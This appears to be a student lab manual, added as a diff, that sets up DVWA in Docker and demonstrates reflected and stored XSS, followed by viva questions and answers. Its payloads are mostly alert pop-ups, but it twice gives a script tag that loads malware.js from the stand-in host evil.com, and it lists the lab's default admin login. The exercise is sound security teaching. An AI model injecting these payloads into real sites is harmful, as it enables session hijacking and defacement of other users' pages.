@@ -1,0 +1,104 @@
+AWX Experiment
+
+Detecting XSS Vulnerabilities in Web Application (Reflected & Stored XSS)
+- Perform reflected XSS attack and stored XSS attack using Mutillidae/DVWA 
+ 
+1. To install DVWA (or Mutillidae) using Docker
+-> Ensure Docker is installed on your Kali Linux machine:
+sudo apt update && sudo apt install docker.io -y
+
+-> Pull the official DVWA image:
+sudo docker pull citizenstig/dvwa
+
+-> Run the container mapped to port 8080:
+sudo docker run -d -p 8080:80 citizenstig/dvwa
+
+-> Open your browser and go to http://localhost:8080.
+-> Log in as admin / password.
+-> On the home page, click "Create/Reset database" and set security to "low".
+ 
+2. To perform a Reflected XSS attack
+-> Go to "Vulnerabilities" → "XSS (Reflected)" page.
+-> In the input field (often labeled “Name” or similar), enter the payload:
+
+
+<script>alert('XSS Reflected')</script>
+
+
+-> Click "Submit" or equivalent.
+-> If successful, an alert popup with "XSS" will appear instantly as the script is reflected and executed in your browser context.
+-> Try variations for confirming:
+
+<script>prompt(document.domain)</script>
+<img src=x onerror=alert('X')>
+<svg onload=alert(1)>
+
+-> If the payload appears as entered in the HTML response and triggers JS, the app is vulnerable to reflected XSS.
+ 
+3. To perform a Stored XSS attack
+-> Go to "Vulnerabilities" → "XSS (Stored)" page (or find a comment/blog entry section in DVWA).
+-> Enter the XSS payload in any input field that saves/submits content, such as:
+
+
+<script>alert('Stored XSS')</script>
+
+
+
+Typical Stored XSS payload examples:
+
+<script>alert('XSS')</script> — Simple pop-up alert.
+
+<script src="http://evil.com/malware.js"></script> — External malicious script load.
+
+<img src=x onerror=alert('XSS')> — Using image error events.
+
+-> Click "Sign Guestbook", "Add Comment", or similar button.
+-> After submitting, reload the page or visit the same page with another user/browser.
+-> If the alert popup triggers on viewing (not just after submitting), the XSS is stored (persistent).
+
+
+
+VIVA QUESTION AND ANSWERS :
+
+1. What is Cross-Site Scripting (XSS) and how does it affect web applications?
+Answer:
+XSS is a vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. This can lead to session hijacking, defacement, or unauthorized actions in a user’s context.​
+
+2. What is the difference between Reflected and Stored XSS?
+Answer:
+
+Reflected XSS immediately reflects malicious input from the request, requiring a victim to click a crafted link.
+
+Stored XSS persists the malicious script in the server’s database or logs, affecting all users who view the infected content.​
+
+3. Give examples of typical payloads for Reflected and Stored XSS.
+Answer:
+Typical payloads include:
+
+Reflected XSS: <script>alert('XSS')</script>
+
+Stored XSS: <script>alert('Stored XSS')</script> or external script loads like <script src="http://evil.com/malware.js"></script>.​
+
+4. How can you test for Reflected XSS in DVWA?
+Answer:
+Submit XSS payloads in input fields on the Reflected XSS vulnerability page and observe if the payload is executed immediately upon submission, typically visible as alert pop-ups.​
+
+5. How is Stored XSS different to test?
+Answer:
+Stored XSS requires submitting the payload in fields that save user input (e.g., guestbook, comments). The script executes when the data is viewed later or by other users, proving persistence.​
+
+6. What are some security best practices to prevent XSS?
+Answer:
+Use input validation, proper output encoding/escaping, content security policies (CSP), and setting secure HTTP headers to mitigate XSS risks in web applications.​
+
+7. Why is Stored XSS considered more dangerous than Reflected XSS?
+Answer:
+Because the injected script persists on the server and affects all users who view the compromised data, Stored XSS can have a widespread impact versus Reflected XSS which usually targets one user.​
+
+8. What role do web application security labs like DVWA and Mutillidae play in learning about XSS?
+Answer:
+They provide a controlled environment with intentionally vulnerable code to practice injection and mitigation of XSS, helping learners understand real-world attack vectors and defenses.​
+
+9. How do browser Inspect tools help in identifying XSS vulnerabilities?
+Answer:
+They allow examination of HTML, scripts, network requests, and responses to confirm where and how user inputs are reflected or stored and executed as scripts within the DOM.
